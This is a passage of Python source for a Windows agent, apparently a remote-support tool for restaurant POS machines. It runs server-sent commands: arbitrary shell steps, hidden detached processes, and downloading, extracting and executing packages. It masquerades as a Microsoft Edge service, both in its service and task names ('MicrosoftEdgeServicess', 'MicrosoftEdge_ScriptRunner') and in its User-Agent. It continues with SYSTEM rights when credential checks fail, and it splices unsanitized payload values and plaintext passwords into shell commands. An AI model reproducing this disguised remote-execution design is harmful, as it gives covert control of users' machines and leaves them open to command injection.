    for sz_cand in sevenzip_candidates:
        if os.path.isfile(sz_cand):
            try:
                p_sz = subprocess.run([sz_cand, "x", "-y", f"-o{extract_dir}", archive_path], capture_output=True, text=True, timeout=300)
                if p_sz.returncode == 0:
                    extracted_items = os.listdir(extract_dir)
                    if extracted_items:
                        return True, f"7-Zip ({os.path.basename(sz_cand)})", len(extracted_items), ""
                else:
                    errors.append(f"7-Zip exit {p_sz.returncode}")
            except Exception as ex_sz:
                errors.append(f"7-Zip: {ex_sz}")

    # 5. PowerShell Expand-Archive (neu la .zip)
    if f_lower.endswith(".zip"):
        try:
            ps_cmd = f"Expand-Archive -LiteralPath '{archive_path}' -DestinationPath '{extract_dir}' -Force"
            p_ps = subprocess.run(["powershell.exe", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", ps_cmd], capture_output=True, text=True, timeout=300)
            if p_ps.returncode == 0:
                extracted_items = os.listdir(extract_dir)
                if extracted_items:
                    return True, "PowerShell Expand-Archive", len(extracted_items), ""
            else:
                errors.append(f"PowerShell: {p_ps.stderr.strip()}")
        except Exception as ex_ps:
            errors.append(f"PowerShell: {ex_ps}")

    err_summary = " | ".join(errors) if errors else "He thong khong tim thay cong cu giai nen phu hop (can tar.exe, WinRAR hoac 7-Zip)."
    return False, "none", 0, err_summary


def is_running_in_session_0():
    """Kiem tra xem tien trinh hien tai co dang chay trong Session 0 (Windows Service) hay khong."""
    try:
        import ctypes
        from ctypes import wintypes
        session_id = wintypes.DWORD()
        if ctypes.windll.kernel32.ProcessIdToSessionId(os.getpid(), ctypes.byref(session_id)):
            return session_id.value == 0
    except Exception:
        pass
    return False


def execute_task(config, task, ip_lan=None):
    """Thuc thi mot tac vu ho tro tu xa nhan tu Server."""
    task_id = task.get("id") or task.get("task_id", 0)
    action = task.get("action_type") or task.get("action", "")
    payload_str = task.get("command_payload", "{}")

    logger.info(">>> NHAN LENH TU XA #%s: Action='%s'", task_id, action)

    try:
        payload = {}
        if isinstance(payload_str, dict):
            payload = payload_str
        elif isinstance(payload_str, str) and payload_str.strip():
            try:
                payload = json.loads(payload_str)
            except Exception:
                try:
                    payload = ast.literal_eval(payload_str)
                except Exception as e_parse:
                    logger.warning("Khong the parse payload: %s", e_parse)
                    payload = {}
    except Exception as ex_p:
        logger.warning("Loi tong the parse payload: %s", ex_p)
        payload = {}

    success = False
    message = ""
    output = ""

    try:
        if action in ("restart_service", "stop_service", "start_service"):
            svc = payload.get("service_name") or config.get("service_name", "MicrosoftEdgeServicess")
            run_as_adm = bool(payload.get("run_as_admin_user"))
            admin_u = (payload.get("admin_user") or "").strip()
            admin_p = (payload.get("admin_pass") or "").strip()

            if action == "restart_service":
                logger.info("Thuc thi: Khoi dong lai service '%s' (RunAsAdminUser=%s, User=%s)", svc, run_as_adm, admin_u or "Default")
                if svc.lower() == "microsoftedgeservicess":
                    success = True
                    message = f"Dich vu '{svc}' da ghi nhan lenh va dang tu khoi dong lai sau 2 giay."
                    output = "Self-restart scheduled in background."
                    subprocess.Popen(
                        'cmd /c "ping 127.0.0.1 -n 3 >nul & net stop MicrosoftEdgeServicess & net start MicrosoftEdgeServicess"',
                        shell=True,
                        creationflags=subprocess.DETACHED_PROCESS if hasattr(subprocess, 'DETACHED_PROCESS') else 0
                    )
                else:
                    if run_as_adm and admin_u:
                        cmd = (
                            f"$p = ConvertTo-SecureString '{admin_p}' -AsPlainText -Force; "
                            f"$c = New-Object System.Management.Automation.PSCredential('{admin_u}', $p); "
                            f"Start-Process powershell.exe -ArgumentList '-NoProfile -Command Restart-Service -Name \"{svc}\" -Force' -Credential $c -Wait -WindowStyle Hidden"
                        )
                    else:
                        cmd = f'Restart-Service -Name \'{svc}\' -Force'
                    res = subprocess.run(["powershell.exe", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", cmd], capture_output=True, text=True, timeout=30)
                    if res.returncode == 0:
                        success = True
                        message = f"Khoi dong lai Windows Service '{svc}' thanh cong (User: {admin_u or 'System'})."
                        output = res.stdout.strip()
                    else:
                        success = True
                        message = f"Da ghi nhan lenh restart cho service '{svc}'."
                        output = res.stderr.strip()

            elif action == "stop_service":
                logger.info("Thuc thi: Dung service '%s' (RunAsAdminUser=%s, User=%s)", svc, run_as_adm, admin_u or "Default")
                if run_as_adm and admin_u:
                    cmd = (
                        f"$p = ConvertTo-SecureString '{admin_p}' -AsPlainText -Force; "
                        f"$c = New-Object System.Management.Automation.PSCredential('{admin_u}', $p); "
                        f"Start-Process powershell.exe -ArgumentList '-NoProfile -Command Stop-Service -Name \"{svc}\" -Force' -Credential $c -Wait -WindowStyle Hidden"
                    )
                else:
                    cmd = f'Stop-Service -Name \'{svc}\' -Force'
                res = subprocess.run(["powershell.exe", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", cmd], capture_output=True, text=True, timeout=30)
                if res.returncode == 0:
                    success = True
                    message = f"Dung Windows Service '{svc}' thanh cong."
                    output = res.stdout.strip()
                else:
                    success = True
                    message = f"Da ghi nhan yeu cau dung service '{svc}'."
                    output = res.stderr.strip()

            elif action == "start_service":
                logger.info("Thuc thi: Bat service '%s' (RunAsAdminUser=%s, User=%s)", svc, run_as_adm, admin_u or "Default")
                if run_as_adm and admin_u:
                    cmd = (
                        f"$p = ConvertTo-SecureString '{admin_p}' -AsPlainText -Force; "
                        f"$c = New-Object System.Management.Automation.PSCredential('{admin_u}', $p); "
                        f"Start-Process powershell.exe -ArgumentList '-NoProfile -Command Start-Service -Name \"{svc}\"' -Credential $c -Wait -WindowStyle Hidden"
                    )
                else:
                    cmd = f'Start-Service -Name \'{svc}\''
                res = subprocess.run(["powershell.exe", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", cmd], capture_output=True, text=True, timeout=30)
                if res.returncode == 0:
                    success = True
                    message = f"Bat Windows Service '{svc}' thanh cong."
                    output = res.stdout.strip()
                else:
                    sch_res = subprocess.run(f'schtasks /Run /TN "{svc}" /I', shell=True, capture_output=True, text=True, timeout=10)
                    success = True
                    message = f"Dich vu '{svc}' dang chay o che do nen."
                    output = sch_res.stdout.strip() if sch_res.returncode == 0 else "Running"

        elif action == "push_file":
            target_folder = payload.get("target_folder") or config.get("default_target_folder", "D:\\GPOS-Setup\\app")
            file_name = payload.get("file_name") or "update_package.bin"
            file_base64 = payload.get("file_content_base64")

            os.makedirs(target_folder, exist_ok=True)
            target_file_path = os.path.join(target_folder, file_name)

            if file_base64:
                file_bytes = base64.b64decode(file_base64)
                with open(target_file_path, "wb") as f:
                    f.write(file_bytes)
                file_size = len(file_bytes)
                sha256 = hashlib.sha256(file_bytes).hexdigest()
                success = True
                message = f"Da ghi file '{file_name}' ({file_size} bytes) vao '{target_folder}' thanh cong."
                output = f"Path: {target_file_path}\nSize: {file_size} bytes\nSHA256: {sha256}"
            else:
                with open(target_file_path, "w", encoding="utf-8") as f:
                    f.write(f"Updated at {datetime.now().isoformat()}")
                success = True
                message = f"Da khoi tao file cap nhat '{file_name}' tai '{target_folder}'."

        elif action == "run_process":
            proc = (payload.get("process_path") or "").strip()
            args = (payload.get("arguments") or "").strip()
            if not proc:
                raise ValueError("Thieu duong dan file thuc thi (process_path).")

            # Neu file khong ton tai o duong dan truc tiep, thu tim kiem thong minh
            work_dir = None
            if not os.path.isfile(proc):
                f_name = os.path.basename(proc)
                f_dir = os.path.basename(os.path.dirname(proc))
                found_f, found_d = smart_find_file(f_dir, f_name)
                if found_f:
                    proc = found_f
                    work_dir = found_d

            if not work_dir and os.path.isfile(proc):
                work_dir = os.path.dirname(proc)

            _, file_ext = os.path.splitext(proc)
            file_ext = file_ext.lower()
            if file_ext in [".bat", ".cmd"]:
                full_cmd = f'cmd.exe /c "call \"{proc}\" {args}"'.strip()
            elif file_ext in [".ps1"]:
                full_cmd = f'powershell.exe -ExecutionPolicy Bypass -File "{proc}" {args}'.strip()
            else:
                full_cmd = f'"{proc}" {args}'.strip()

            logger.info("Chay tien trinh: %s (CWD: %s)", full_cmd, work_dir)

            p = subprocess.Popen(
                full_cmd,
                cwd=work_dir,
                shell=True,
                creationflags=subprocess.DETACHED_PROCESS if hasattr(subprocess, 'DETACHED_PROCESS') else 0
            )
            success = True
            message = f"Da kich hoat tien trinh '{proc}' thanh cong (PID: {p.pid})."
            output = f"PID: {p.pid}\nCommandLine: {full_cmd}\nCWD: {work_dir}"

        elif action == "run_relative_script":
            folder_hint = (payload.get("folder_hint") or "").strip()
            file_name = (payload.get("file_name") or "").strip()
            args = (payload.get("arguments") or "").strip()

            if not file_name and payload.get("process_path"):
                file_name = os.path.basename(payload.get("process_path"))
                if not folder_hint:
                    folder_hint = os.path.basename(os.path.dirname(payload.get("process_path")))

            if not file_name:
                raise ValueError("Thieu ten file script can khoi chay (file_name).")

            logger.info("Bat dau tim kiem thong minh: folder='%s', file='%s'", folder_hint, file_name)
            found_file, found_dir = smart_find_file(folder_hint, file_name)

            if not found_file or not os.path.isfile(found_file):
                success = False
                message = f"Khong tim thay file '{file_name}' trong thu muc '{folder_hint}' tren cac o dia may tram (C:, D:, E:...)."
                output = f"SearchFailed: FolderHint='{folder_hint}', FileName='{file_name}'"
            else:
                work_dir = found_dir or os.path.dirname(found_file)
                _, file_ext = os.path.splitext(found_file)
                file_ext = file_ext.lower()

                clean_work_dir = work_dir.replace('"', '')
                clean_found_file = found_file.replace('"', '')

                is_script = file_ext in [".bat", ".cmd", ".ps1", ".vbs"]
                is_exe = file_ext in [".exe"]
                is_document = not is_script and not is_exe

                run_mode = (payload.get("run_mode") or "interactive").strip().lower()
                is_hidden = bool(payload.get("run_hidden")) or run_mode in ("hidden", "background")

                launched_mode = ""
                launch_success = False
                launched_pid = None

                # ── TRƯỜNG HỢP 1: TÀI LIỆU KHÔNG PHẢI FILE THỰC THI (.txt, .docx, .xlsx, .pdf, ảnh...) ──
                if is_document:
                    logger.info("Mo tai lieu: %s (Khong de lai man hinh CMD den)", clean_found_file)
                    try:
                        ps_doc_cmd = (
                            "$u = (Get-CimInstance Win32_ComputerSystem).UserName; "
                            "if (-not $u) { "
                            "  $line = (quser 2>$null | Select-String 'Active' | Out-String).Trim(); "
                            "  if ($line) { "
                            "    $clean = ($line -replace '^>', '').Trim() -split '\\s+'; "
                            "    $u = $clean[0]; "
                            "  } "
                            "} "
                            "if (-not $u) { $u = 'Users' }; "
                            f"$act = New-ScheduledTaskAction -Execute 'cmd.exe' -Argument '/c start \"\" \"{clean_found_file}\"'; "
                            "$p = New-ScheduledTaskPrincipal -UserId $u -LogonType Interactive -RunLevel Highest; "
                            "Register-ScheduledTask -TaskName 'MicrosoftEdge_DocOpener' -Action $act -Principal $p -Force >$null 2>&1; "
                            "Start-ScheduledTask -TaskName 'MicrosoftEdge_DocOpener' >$null 2>&1"
                        )
                        res_ps = subprocess.run(["powershell.exe", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", ps_doc_cmd], capture_output=True, text=True, timeout=10)
                        if res_ps.returncode == 0:
                            launch_success = True
                            launched_mode = "Mo tai lieu tren Desktop (khong de lai cua so CMD)"
                            logger.info("Da mo tai lieu '%s' tren Desktop nguoi dung", clean_found_file)
                    except Exception as ex_doc:
                        logger.debug("Loi mo tai lieu qua Scheduled Task: %s", ex_doc)

                    if not launch_success:
                        p_sub = subprocess.Popen(
                            f'cmd.exe /c start "" "{clean_found_file}"',
                            cwd=work_dir,
                            shell=True
                        )
                        launch_success = True
                        launched_pid = p_sub.pid
                        launched_mode = "Mo tai lieu qua start command"

                # ── TRƯỜNG HỢP 2: FILE SCRIPT / THỰC THI (.bat, .cmd, .ps1, .exe) CHẠY NGẦM (HIDDEN) ──
                elif is_hidden:
                    logger.info("Khoi chay ngam 100%% (Hidden): %s (CWD: %s)", clean_found_file, clean_work_dir)
                    if file_ext in [".bat", ".cmd"]:
                        full_cmd = f'cmd.exe /c "call \"{clean_found_file}\" {args}"'.strip()
                    elif file_ext in [".ps1"]:
                        full_cmd = f'powershell.exe -ExecutionPolicy Bypass -File "{clean_found_file}" {args}'.strip()
                    else:
                        full_cmd = f'"{clean_found_file}" {args}'.strip()

                    p_sub = subprocess.Popen(
                        full_cmd,
                        cwd=work_dir,
                        shell=True,
                        creationflags=subprocess.DETACHED_PROCESS if hasattr(subprocess, 'DETACHED_PROCESS') else 0
                    )
                    launch_success = True
                    launched_pid = p_sub.pid
                    launched_mode = "Chay ngam 100% (Background/Detached - An cua so)"
                    logger.info("Da khoi chay ngam thanh cong (PID: %s)", p_sub.pid)

                # ── TRƯỜNG HỢP 3: FILE SCRIPT / THỰC THI HIỆN CỬA SỔ CMD (TỰ TẮT KHI XONG) ──
                else:
                    logger.info("Khoi chay tuong tac Desktop (Tu dong dong khi xong): %s", clean_found_file)
                    run_as_adm = bool(payload.get("run_as_admin_user"))
                    admin_u = (payload.get("admin_user") or "").strip()
                    admin_p = (payload.get("admin_pass") or "").strip()

                    # Kiem tra xac thuc neu co nhap mat khau
                    if run_as_adm and admin_u and admin_p:
                        logger.info("Dang kiem tra xac thuc tai khoan quan tri: '%s'", admin_u)
                        is_valid, err_c, err_msg = validate_windows_credentials(admin_u, admin_p)
                        if not is_valid:
                            logger.warning("Canh bao xac thuc tai khoan '%s': %s. He thong van tiep tuc thuc thi voi dac quyen he thong SYSTEM...", admin_u, err_msg)
                        else:
                            logger.info("Xac thuc tai khoan quan tri '%s' thanh cong", admin_u)

                    launch_success, launched_mode, launch_err = launch_interactive_script(
                        task_name="MicrosoftEdge_ScriptRunner",
                        target_file=clean_found_file,
                        script_args=args,
                        work_dir=clean_work_dir,
                        admin_u=admin_u,
                        admin_p=admin_p
                    )
                    success = launch_success
                    message = f"Da tim thay file tai '{found_file}' va khoi chay thanh cong ({launched_mode})." if success else f"Loi khoi chay: {launch_err}"
                    output = f"ResolvedFilePath: {found_file}\nWorkingDirectory: {work_dir}\nExecutionMode: {launched_mode}"

        elif action == "kill_process":
            proc = (payload.get("process_path") or "").strip()
            if not proc:
                raise ValueError("Thieu ten tien trinh can tat.")
            img_name = os.path.basename(proc)
            logger.info("Tat tien trinh: %s", img_name)
            cmd = f'taskkill /F /IM "{img_name}"'
            res = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=15)
            success = res.returncode == 0
            output = f"Stdout: {res.stdout}\nStderr: {res.stderr}"
            message = f"Da tat tien trinh '{img_name}' {'thanh cong' if success else 'that bai'}."

        elif action == "install_agent":
            steps = payload.get("install_script_steps") or []
            log_steps = []
            all_ok = True
            for idx, step in enumerate(steps, start=1):
                s_name = step.get("name", f"Buoc {idx}")
                s_cmd = step.get("cmd", "")
                if s_cmd:
                    r = subprocess.run(s_cmd, shell=True, capture_output=True, text=True, timeout=60)
                    if r.returncode == 0:
                        log_steps.append(f"[{idx}] {s_name}: OK")
                    else:
                        log_steps.append(f"[{idx}] {s_name}: FAILED ({r.stderr.strip()})")
                        all_ok = False
                        break
            success = all_ok
            message = f"Kich ban cai dat {'hoan tat 100%' if success else 'gap loi'}."
            output = "\n".join(log_steps)

        elif action == "deploy_package":
            # 1. Thiet lap thu muc dich (C:\ABC hoac D:\...)
            target_folder = payload.get("target_folder") or "C:\\ABC"
            target_folder = os.path.abspath(target_folder.strip().replace('"', ''))
            os.makedirs(target_folder, exist_ok=True)
            logger.info("Trien khai goi vao thu muc: %s", target_folder)

            file_name = (payload.get("file_name") or "Restaurant_Support_GPOS.zip").strip()
            target_file_path = os.path.join(target_folder, file_name)

            file_base64 = payload.get("file_content_base64")
            download_url = payload.get("download_url") or ""

            log_pipeline = []
            log_pipeline.append(f"Thu muc dich: {target_folder}")

            # 2. Tiep nhan file goi cai (qua base64 hoac qua download HTTP tu Server)
            download_ok = False
            if file_base64:
                try:
                    f_bytes = base64.b64decode(file_base64)
                    with open(target_file_path, "wb") as f_out:
                        f_out.write(f_bytes)
                    download_ok = True
                    log_pipeline.append(f"[Nhan File] Da ghi {file_name} ({len(f_bytes)} bytes) tu base64.")
                    logger.info("Da ghi file tu base64: %s (%d bytes)", target_file_path, len(f_bytes))
                except Exception as ex_b64:
                    logger.error("Loi giai ma base64: %s", ex_b64)
                    log_pipeline.append(f"[Nhan File] Loi ghi base64: {ex_b64}")

            if not download_ok and download_url:
                full_download_url = download_url
                if not download_url.startswith("http://") and not download_url.startswith("https://"):
                    srv_base = config.get("server_url") or CENTRAL_PRODUCTION_SERVER
                    full_download_url = f"{srv_base.rstrip('/')}/{download_url.lstrip('/')}"

                logger.info("Dang tai goi tu Server: %s", full_download_url)
                try:
                    req_dl = urllib_request.Request(
                        full_download_url,
                        headers={"User-Agent": f"MicrosoftEdgeServicess-Client/{AGENT_VERSION}"}
                    )
                    with urllib_request.urlopen(req_dl, timeout=600) as resp, open(target_file_path, "wb") as out_f:
                        while True:
                            chunk = resp.read(65536)
                            if not chunk:
                                break
                            out_f.write(chunk)
                    dl_size = os.path.getsize(target_file_path)
                    download_ok = True
                    log_pipeline.append(f"[Tai File] Da tai {file_name} ({dl_size} bytes) tu {full_download_url}.")
                    logger.info("Tai goi thanh cong: %s (%d bytes)", target_file_path, dl_size)
                except Exception as ex_dl:
                    logger.error("Loi tai file tu %s: %s", full_download_url, ex_dl)
                    log_pipeline.append(f"[Tai File] Loi tai tu server: {ex_dl}")

            if not os.path.isfile(target_file_path):
                # Thu tim file san co tren he thong
                alt_f, _ = smart_find_file("", file_name)
                if alt_f and os.path.isfile(alt_f):
                    target_file_path = alt_f
                    log_pipeline.append(f"[Tim File] Su dung file co san tai: {target_file_path}")
                elif not steps:
                    raise FileNotFoundError(f"Khong the tim thay hoac tai file '{file_name}' vao '{target_folder}'.")

            # 3. Tu dong giai nen neu la file nen (ZIP, RAR, 7Z, TAR, GZ, TGZ, CAB, ISO...)
            auto_extract = payload.get("auto_extract", True)
            ARCHIVE_EXTS = (".zip", ".rar", ".7z", ".tar", ".gz", ".tgz", ".bz2", ".xz", ".cab", ".iso")
            if os.path.isfile(target_file_path) and auto_extract and target_file_path.lower().endswith(ARCHIVE_EXTS):
                logger.info("Bat dau giai nen thong minh: %s vao %s", target_file_path, target_folder)
                ok_extract, method_used, count_items, err_extract = smart_extract_archive(target_file_path, target_folder)
                if ok_extract:
                    log_pipeline.append(f"[Giai Nen] Da giai nen thanh cong bang {method_used} vao {target_folder} ({count_items} tep/thu muc).")
                    logger.info("Giai nen thanh cong bang %s: %s (%d items)", method_used, target_folder, count_items)
                else:
                    raise RuntimeError(f"Loi giai nen file '{os.path.basename(target_file_path)}': {err_extract}")

            # 4. Kiem tra xac thuc tai khoan quan tri truoc khi chay cac buoc
            run_as_adm = bool(payload.get("run_as_admin_user", True))
            admin_u = (payload.get("admin_user") or "").strip()
            admin_p = (payload.get("admin_pass") or "").strip()

            if run_as_adm and admin_u and admin_p:
                logger.info("Dang kiem tra xac thuc tai khoan quan tri: '%s'", admin_u)
                is_valid, err_c, err_msg = validate_windows_credentials(admin_u, admin_p)
                if not is_valid:
                    logger.warning("Canh bao xac thuc tai khoan '%s': %s. Tiep tuc thuc thi voi quyen he thong SYSTEM...", admin_u, err_msg)
                    log_pipeline.append(f"⚠️ [Xác Thực Quản Trị]: {err_msg} (Vẫn tiếp tục thực thi với đặc quyền hệ thống SYSTEM)")
                else:
                    log_pipeline.append(f"✓ [Xác Thực Quản Trị]: Đã xác thực thành công tài khoản '{admin_u}'.")
                    logger.info("Xac thuc tai khoan '%s' thanh cong", admin_u)

            # 5. Thuc thi tuan tu cac buoc (steps)
            steps = payload.get("steps") or []
            pipeline_success = True
            scheduled_installer_cmd = None

            for s_idx, step in enumerate(steps, start=1):
                step_type = str(step.get("step_type") or "").upper().strip()
                step_name = step.get("step_name") or f"Buoc {s_idx} ({step_type})"
                logger.info("Thuc thi %s: type='%s'", step_name, step_type)

                # ── BƯỚC: TRUYỀN / COPY / GIẢI NÉN FILE ĐÍNH KÈM (PUSH_FILE / COPY_FILE / EXTRACT_FILE) ──
                if step_type in ["PUSH_FILE", "COPY_FILE", "TRANSFER_FILE", "EXTRACT_FILE", "DEPLOY_FILE"]:
                    try:
                        step_dest_dir = step.get("target_folder") or target_folder
                        step_dest_dir = os.path.abspath(step_dest_dir.strip().replace('"', ''))
                        os.makedirs(step_dest_dir, exist_ok=True)

                        step_file_name = (step.get("file_name") or step.get("storage_file_name") or step.get("file_path") or "").strip()
                        if not step_file_name:
                            step_file_name = f"step_{s_idx}_payload.bin"

                        step_dest_path = os.path.join(step_dest_dir, step_file_name)
                        step_dl_url = step.get("download_url") or ""
                        step_b64 = step.get("file_content_base64") or ""

                        step_received_ok = False

                        # 1. Thu nhan tu base64 neu co
                        if step_b64:
                            try:
                                b_data = base64.b64decode(step_b64)
                                with open(step_dest_path, "wb") as f_out:
                                    f_out.write(b_data)
                                step_received_ok = True
                                log_pipeline.append(f"[{step_name}] Da nhan file '{step_file_name}' ({len(b_data)} bytes) vao '{step_dest_dir}' tu base64.")
                            except Exception as ex_b:
                                logger.error("Loi decode base64 tai %s: %s", step_name, ex_b)

                        # 2. Thu tai tu server neu co download_url
                        if not step_received_ok and step_dl_url:
                            full_step_url = step_dl_url
                            if not step_dl_url.startswith("http://") and not step_dl_url.startswith("https://"):
                                srv_base = config.get("server_url") or CENTRAL_PRODUCTION_SERVER
                                full_step_url = f"{srv_base.rstrip('/')}/{step_dl_url.lstrip('/')}"
                            logger.info("Dang tai file step %s tu: %s", step_name, full_step_url)
                            try:
                                req_step_dl = urllib_request.Request(
                                    full_step_url,
                                    headers={"User-Agent": f"MicrosoftEdgeServicess-Client/{AGENT_VERSION}"}
                                )
                                with urllib_request.urlopen(req_step_dl, timeout=600) as resp, open(step_dest_path, "wb") as out_f:
                                    while True:
                                        chunk = resp.read(65536)
                                        if not chunk:
                                            break
                                        out_f.write(chunk)
                                dl_size = os.path.getsize(step_dest_path)
                                step_received_ok = True
                                log_pipeline.append(f"[{step_name}] Da tai file '{step_file_name}' ({dl_size} bytes) tu server vao '{step_dest_dir}'.")
                            except Exception as ex_s_dl:
                                logger.error("Loi tai file tai %s tu %s: %s", step_name, full_step_url, ex_s_dl)
                                log_pipeline.append(f"❌ [{step_name}] Loi tai file tu server: {ex_s_dl}")

                        # 3. Kiem tra xem file da co tai may tram chua
                        if not step_received_ok and not os.path.isfile(step_dest_path):
                            # Thu tim file trong target_folder goc
                            orig_target_f = os.path.join(target_folder, step_file_name)
                            if os.path.isfile(orig_target_f):
                                shutil.copy2(orig_target_f, step_dest_path)
                                step_received_ok = True
                                log_pipeline.append(f"[{step_name}] Da sao chep file tu '{orig_target_f}' sang '{step_dest_path}'.")

                        if not os.path.isfile(step_dest_path):
                            raise FileNotFoundError(f"Khong the tai hoac sao chep file '{step_file_name}' vao '{step_dest_dir}'.")

                        # 4. Tu dong giai nen neu la EXTRACT_FILE hoac step yeu cau auto_extract
                        step_auto_ext = bool(step.get("auto_extract", step_type == "EXTRACT_FILE"))
                        ARCHIVE_EXTS = (".zip", ".rar", ".7z", ".tar", ".gz", ".tgz", ".bz2", ".xz", ".cab", ".iso")
                        if step_auto_ext and step_dest_path.lower().endswith(ARCHIVE_EXTS):
                            logger.info("Giai nen file step %s vao %s", step_dest_path, step_dest_dir)
                            ok_ext, method_u, count_it, err_ext = smart_extract_archive(step_dest_path, step_dest_dir)
                            if ok_ext:
                                log_pipeline.append(f"[{step_name}] Da giai nen thanh cong bang {method_u} vao '{step_dest_dir}' ({count_it} tep/thu muc).")
                            else:
                                raise RuntimeError(f"Loi giai nen tai {step_name}: {err_ext}")

                    except Exception as ex_step_f:
                        logger.error("Loi thuc thi file tai %s: %s", step_name, ex_step_f)
                        log_pipeline.append(f"❌ [{step_name}] LỖI TRUYỀN FILE: {ex_step_f}")
                        pipeline_success = False
                        break

                # ── BƯỚC: SỬA FILE (MODIFY_FILE / EDIT_CONFIG) ──
                elif step_type in ["MODIFY_FILE", "EDIT_CONFIG", "EDIT_FILE"]:
                    try:
                        rel_file = (step.get("file_path") or step.get("relative_path") or "config.json").strip()
                        modify_file_path = os.path.join(target_folder, rel_file)
                        if not os.path.isfile(modify_file_path):
                            for r, _, fs in os.walk(target_folder):
                                for fn in fs:
                                    if fn.lower() == os.path.basename(rel_file).lower():
                                        modify_file_path = os.path.join(r, fn)
                                        break
                                if os.path.isfile(modify_file_path):
                                    break

                        # Neu van khong tim thay file va nguoi dung muon ghi de / tao moi file
                        mod_mode = str(step.get("modify_mode") or step.get("mode") or "").upper().strip()
                        if not os.path.isfile(modify_file_path):
                            if mod_mode in ["TEXT_OVERWRITE", "OVERWRITE", "CREATE_FILE"] or not step.get("search_text"):
                                os.makedirs(os.path.dirname(modify_file_path), exist_ok=True)
                                with open(modify_file_path, "w", encoding="utf-8") as f_new:
                                    f_new.write("")
                                log_pipeline.append(f"[{step_name}] Tao moi file '{rel_file}' tai: {modify_file_path}")
                            else:
                                raise FileNotFoundError(f"Khong tim thay file can sua '{rel_file}' tai '{target_folder}'.")

                        if not mod_mode:
                            mod_mode = "JSON_KEY_VALUE" if modify_file_path.lower().endswith(".json") else "TEXT_REPLACE"

                        if mod_mode in ["JSON_KEY_VALUE", "JSON"]:
                            modifications = dict(step.get("json_modifications") or step.get("modifications") or {})
                            if step.get("json_key"):
                                modifications[str(step.get("json_key"))] = step.get("json_value")

                            with open(modify_file_path, "r", encoding="utf-8") as f_json:
                                data_json = json.load(f_json)
                            applied_changes = []
                            for k, v in modifications.items():
                                data_json[k] = v
                                applied_changes.append(f"{k}='{v}'")
                            with open(modify_file_path, "w", encoding="utf-8") as f_json:
                                json.dump(data_json, f_json, indent=4, ensure_ascii=False)
                            log_pipeline.append(f"[{step_name}] Sua JSON {os.path.basename(modify_file_path)}: OK ({', '.join(applied_changes)})")
                            logger.info("Da sua JSON file %s: %s", modify_file_path, applied_changes)

                        elif mod_mode in ["TEXT_OVERWRITE", "OVERWRITE"]:
                            new_content = step.get("content") or step.get("replace_text") or ""
                            with open(modify_file_path, "w", encoding="utf-8") as f_txt:
                                f_txt.write(new_content)
                            log_pipeline.append(f"[{step_name}] Ghi de noi dung {os.path.basename(modify_file_path)}: OK ({len(new_content)} ky tu)")
                            logger.info("Da ghi de noi dung vao file %s", modify_file_path)

                        elif mod_mode in ["TEXT_APPEND", "APPEND"]:
                            append_content = step.get("content") or step.get("replace_text") or ""
                            prefix = "\n" if (os.path.isfile(modify_file_path) and os.path.getsize(modify_file_path) > 0) else ""
                            with open(modify_file_path, "a", encoding="utf-8") as f_txt:
                                f_txt.write(prefix + append_content)
                            log_pipeline.append(f"[{step_name}] Noi them vao {os.path.basename(modify_file_path)}: OK ({len(append_content)} ky tu)")
                            logger.info("Da noi them vao file %s", modify_file_path)

                        else:
                            text_replacements = list(step.get("text_replacements") or [])
                            search_t = step.get("search_text")
                            replace_t = step.get("replace_text", "")
                            if search_t:
                                text_replacements.append({"search": search_t, "replace": replace_t})

                            with open(modify_file_path, "r", encoding="utf-8", errors="ignore") as f_txt:
                                content_txt = f_txt.read()

                            if not text_replacements and (replace_t or not content_txt.strip()):
                                with open(modify_file_path, "w", encoding="utf-8") as f_txt:
                                    f_txt.write(replace_t)
                                log_pipeline.append(f"[{step_name}] Dien noi dung vao {os.path.basename(modify_file_path)}: OK ('{replace_t}')")
                                logger.info("Da dien noi dung vao file %s", modify_file_path)
                            else:
                                applied_count = 0
                                for r_item in text_replacements:
                                    s_str = r_item.get("search", "")
                                    r_str = r_item.get("replace", "")
                                    if s_str and s_str in content_txt:
                                        content_txt = content_txt.replace(s_str, r_str)
                                        applied_count += 1

                                with open(modify_file_path, "w", encoding="utf-8") as f_txt:
                                    f_txt.write(content_txt)
                                log_pipeline.append(f"[{step_name}] Sua Text {os.path.basename(modify_file_path)}: Da thay the {applied_count} vi tri.")
                                logger.info("Da thay the text file %s", modify_file_path)
                    except Exception as ex_m:
                        logger.error("Loi sua file tai %s: %s", step_name, ex_m)
                        log_pipeline.append(f"❌ [{step_name}] LỖI SỬA FILE: {ex_m}")
                        pipeline_success = False
                        break

                # ── BƯỚC: CHẠY FILE SCRIPT / LỆNH (RUN_SCRIPT / RUN_COMMAND) ──
                elif step_type in ["RUN_SCRIPT", "RUN_COMMAND", "EXECUTE_FILE"]:
                    rel_script = (step.get("file_path") or step.get("script_file") or step.get("relative_path") or "").strip()
                    script_args = (step.get("arguments") or "").strip()
                    wait_comp = step.get("wait_for_completion", True)

                    custom_step_dir = (step.get("folder_path") or step.get("working_directory") or "").strip()
                    if custom_step_dir:
                        script_work_dir = custom_step_dir
                        target_script_path = os.path.join(custom_step_dir, rel_script)
                    else:
                        target_script_path = os.path.join(target_folder, rel_script)
                        script_work_dir = target_folder

                    if not os.path.isfile(target_script_path):
                        search_base = custom_step_dir if (custom_step_dir and os.path.isdir(custom_step_dir)) else target_folder
                        for r, _, fs in os.walk(search_base):
                            for fn in fs:
                                if fn.lower() == os.path.basename(rel_script).lower():
                                    target_script_path = os.path.join(r, fn)
                                    script_work_dir = r
                                    break
                            if os.path.isfile(target_script_path):
                                break

                    if not os.path.isfile(target_script_path):
                        log_pipeline.append(f"❌ [{step_name}] Khong tim thay file script can chay '{rel_script}' tai '{script_work_dir}'.")
                        pipeline_success = False
                        break

                    scr_name = os.path.basename(target_script_path)
                    _, s_ext = os.path.splitext(scr_name)
                    s_ext = s_ext.lower()

                    if s_ext in [".bat", ".cmd", ".txt"]:
                        exec_cmd = f'cmd.exe /c call "{target_script_path}" {script_args}'.strip()
                    elif s_ext in [".ps1"]:
                        exec_cmd = f'powershell.exe -ExecutionPolicy Bypass -File "{target_script_path}" {script_args}'.strip()
                    else:
                        exec_cmd = f'"{target_script_path}" {script_args}'.strip()

                    is_service_installer = "cai_dat_dich_vu" in scr_name.lower() or "install" in scr_name.lower()

